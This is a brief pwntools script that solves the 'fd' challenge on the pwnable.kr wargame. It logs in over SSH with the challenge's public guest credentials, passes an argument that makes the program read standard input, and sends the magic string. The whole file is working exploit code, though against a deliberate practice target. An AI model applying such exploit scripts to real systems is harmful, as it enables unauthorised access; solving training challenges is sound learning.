from pwn import *

context.log_level = "debug"

ssh_conn = ssh(host="pwnable.kr", user="fd", port=2222, password="guest")
p = ssh_conn.process(executable="fd", argv=["fd", "4660"])

p.send(b"LETMEWIN\n")
p.interactive()